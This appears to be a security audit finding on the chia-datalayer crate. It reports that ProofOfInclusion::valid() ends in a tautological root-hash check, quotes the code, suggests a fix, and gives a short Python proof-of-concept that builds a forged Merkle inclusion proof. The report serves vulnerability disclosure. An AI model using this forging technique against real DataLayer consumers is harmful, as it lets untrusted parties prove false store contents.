### Title
`ProofOfInclusion::valid()` Tautological Root-Hash Check Allows Forged DataLayer Inclusion Proofs - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary
`ProofOfInclusion::valid()` contains a logically tautological final assertion: after the loop, `existing_hash` is always equal to `self.root_hash()` by construction, making the check meaningless. The function therefore only verifies internal hash-chain consistency, never that the proof anchors to the actual tree root. An untrusted party can craft a `ProofOfInclusion` for any arbitrary `node_hash` that passes `valid()` while pointing to a completely fabricated root, enabling forged DataLayer inclusion proofs.

### Finding Description

`ProofOfInclusion::valid()` is implemented as follows:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;   // ← set to layer.combined_hash
    }

    existing_hash == self.root_hash()      // ← always true when layers exist
}
``` [1](#0-0) 

`root_hash()` is defined as:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash          // ← same value as existing_hash after the loop
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

After the loop, `existing_hash` holds the last `calculated_hash`, which the loop already verified equals `last_layer.combined_hash`. `self.root_hash()` also returns `last_layer.combined_hash`. Therefore `existing_hash == self.root_hash()` reduces to `last_layer.combined_hash == last_layer.combined_hash` — a tautology that is always `true`.

The function never compares the computed root against an externally-supplied, trusted tree root. Any attacker who can supply a `ProofOfInclusion` object (via the Streamable deserialization path or the Python/WASM binding) can construct an internally-consistent but entirely fabricated proof chain for any `node_hash` of their choosing, and `valid()` will return `true`.

`ProofOfInclusion` is a `Streamable` struct exposed directly to Python: [3](#0-2) 

The Python binding exposes `valid()` as a standalone callable with no additional root-hash parameter: [4](#0-3) 

All existing tests and the fuzz target call only `proof.valid()` without separately comparing `proof.root_hash()` to the actual tree root, confirming the intended usage pattern: [5](#0-4) [6](#0-5) 

### Impact Explanation

An attacker who can deliver a crafted `ProofOfInclusion` (e.g., over the DataLayer sync protocol) to any consumer that calls only `proof.valid()` can prove the presence of an arbitrary key-value pair in a DataLayer store whose actual root does not contain that pair. This lets untrusted input prove invalid state, matching the allowed High impact: *DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state.*

### Likelihood Explanation

The attack surface is reachable by any unprivileged party that can supply a serialized `ProofOfInclusion` blob. The Streamable format is well-documented and trivially constructable. The tautological check means no hash-collision or cryptographic break is required — only arithmetic consistency within the forged proof itself. All documented usage patterns (tests, fuzz target, Python API) call `valid()` alone, making it highly likely that downstream consumers do the same.

### Recommendation

`valid()` must accept the trusted tree root as an external parameter and compare `existing_hash` against it after the loop, not against `self.root_hash()`:

```rust
pub fn valid(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == expected_root   // compare against the externally-trusted root
}
```

Alternatively, keep the current signature but remove `root_hash()` from the struct and require callers to supply the root explicitly. The Python binding and all call sites must be updated accordingly.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer
import hashlib

# Attacker-chosen leaf hash (not in the real tree)
fake_node_hash = bytes([0xAA] * 32)
fake_sibling   = bytes([0xBB] * 32)

# Compute an internally-consistent combined_hash using the same
# calculate_internal_hash logic (left-side sibling: prefix 0x00..00 || left || right)
def internal_hash(left, right):
    h = hashlib.sha256()
    h.update(b'\x00' * 30)   # 30-byte prefix used by chia DataLayer
    h.update(left)
    h.update(right)
    return h.digest()

combined = internal_hash(fake_sibling, fake_node_hash)  # side = Left (0)

forged = ProofOfInclusion(
    node_hash=fake_node_hash,
    layers=[ProofOfInclusionLayer(
        other_hash_side=0,          # Left
        other_hash=fake_sibling,
        combined_hash=combined,     # attacker-controlled root
    )]
)

# valid() returns True even though no real tree has this root
assert forged.valid(), "Expected True — tautological check passes"
# root_hash() returns the attacker-chosen combined hash, not the real tree root
print("Forged root:", forged.root_hash().hex())
```

The forged proof passes `valid()` with zero cryptographic work, proving inclusion of `fake_node_hash` under a fabricated root that does not correspond to any real DataLayer tree.

### Citations

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L13-29)
```rust
#[derive(Clone, Debug, std::hash::Hash, Eq, PartialEq, Streamable)]
pub struct ProofOfInclusionLayer {
    pub other_hash_side: Side,
    pub other_hash: Hash,
    pub combined_hash: Hash,
}

#[cfg_attr(
    feature = "py-bindings",
    pyclass(get_all, from_py_object),
    derive(PyJsonDict, PyStreamable)
)]
#[derive(Clone, Debug, std::hash::Hash, Eq, PartialEq, Streamable)]
pub struct ProofOfInclusion {
    pub node_hash: Hash,
    pub layers: Vec<ProofOfInclusionLayer>,
}
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L32-38)
```rust
    pub fn root_hash(&self) -> Hash {
        if let Some(last) = self.layers.last() {
            last.combined_hash
        } else {
            self.node_hash
        }
    }
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L40-58)
```rust
    pub fn valid(&self) -> bool {
        let mut existing_hash = self.node_hash;

        for layer in &self.layers {
            let calculated_hash = crate::calculate_internal_hash(
                &existing_hash,
                layer.other_hash_side,
                &layer.other_hash,
            );

            if calculated_hash != layer.combined_hash {
                return false;
            }

            existing_hash = calculated_hash;
        }

        existing_hash == self.root_hash()
    }
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L115-124)
```rust
            for kv_id in keys_values.keys().copied() {
                let proof_of_inclusion = match merkle_blob.get_proof_of_inclusion(kv_id) {
                    Ok(proof_of_inclusion) => proof_of_inclusion,
                    Err(error) => {
                        open_dot(merkle_blob.to_dot().unwrap().set_note(&error.to_string()));
                        panic!("here");
                    }
                };
                assert!(proof_of_inclusion.valid());
            }
```

**File:** wheel/python/chia_rs/datalayer.pyi (L237-243)
```text
class ProofOfInclusion:
    node_hash: bytes32
    # children before parents
    layers: list[ProofOfInclusionLayer]

    def root_hash(self) -> bytes32: ...
    def valid(self) -> bool: ...
```

**File:** crates/chia-datalayer/fuzz/fuzz_targets/proofs_of_inclusion.rs (L28-31)
```rust
    for key in keys {
        let proof = blob.get_proof_of_inclusion(key).unwrap();
        assert!(proof.valid());
    }
```
